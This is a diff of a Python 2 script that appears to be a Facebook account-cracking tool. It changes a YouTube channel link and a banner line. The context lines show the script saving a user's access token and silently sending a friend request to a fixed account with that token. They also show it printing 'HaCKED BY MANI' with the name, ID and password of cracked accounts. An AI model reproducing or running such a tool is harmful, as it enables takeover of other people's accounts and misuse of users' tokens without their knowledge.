@@ -158,7 +158,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mmubarkaan Login Hogai j sarkar'
-				os.system('xdg-open https://www.youtube.com/channel/UCLyST0WiDcWalhzlcaD1XrQ')
+				os.system('xdg-open https://www.youtube.com/channel/UCKkRTegePJeg0b4J63q90IA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -319,7 +319,7 @@ def pilih_super():
 			if 'access_token' in q:
 				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				z = json.loads(x.text)
-				print '\x1b[1;96m[  ✓  ] \x1b[1;92mHaCKED BY MANI💉'											
+				print '\x1b[1;96m[ ✓ ] \x1b[1;92mHaCKED BY MANI💉'											
 				print '\x1b[1;96m[•⚔•] \x1b[1;92mName \x1b[1;92m ✯ \x1b[1;92m' + b['name']											
 				print '\x1b[1;96m[•⚔•] \x1b[1;92mID \x1b[1;92m      ✯ \x1b[1;92m' + user											
 				print '\x1b[1;96m[•⚔•] \x1b[1;92mPassword \x1b[1;92m✯ \x1b[1;92m' + pass1 + '\n'											
